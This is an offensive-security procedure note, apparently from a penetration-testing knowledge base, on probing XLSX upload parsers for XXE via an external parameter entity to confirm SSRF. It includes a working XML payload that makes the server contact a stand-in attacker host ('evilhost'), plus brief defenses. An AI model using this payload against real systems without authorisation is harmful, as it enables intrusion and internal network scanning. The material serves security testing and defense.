---
tags:
  - xxe
  - ssrf
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
  - AWS
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 0a117588-2a26-4040-bcd7-24a7b52c36e8
created_at: '2025-12-13T09:00:28.071Z'
updated_at: '2025-12-13T09:00:28.071Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test External Parameter Entity

## Summary

This procedure tests external parameter entities in XXE to enable HTTP-based attacks, such as internal service scanning or SSRF.

## Description

By using an external entity referencing an HTTP URL, attackers can confirm if the parser resolves remote resources, potentially leading to broader exploitation like port scanning on internal networks.

## Requirements

1. Modified XLSX with base XXE
2. Control over an external host (evilhost)
3. Upload access to the application

## Defense

Defensive measures and detection strategies:

- Block external entity resolution entirely
- Monitor outbound HTTP requests from the server

## Objectives

1. Validate external entity support
2. Explore SSRF potential
3. Assess internal scanning feasibility

## Instructions

### Step 1: Modify for External Entity

**Context**: Update the payload for HTTP testing.

Edit the XML to include:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe PUBLIC "lol" "http://evilhost" > %xxe;]>
```

Re-upload and monitor for requests to evilhost.

> This tests if the server makes outbound connections.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xxe]]
- [[ssrf]]
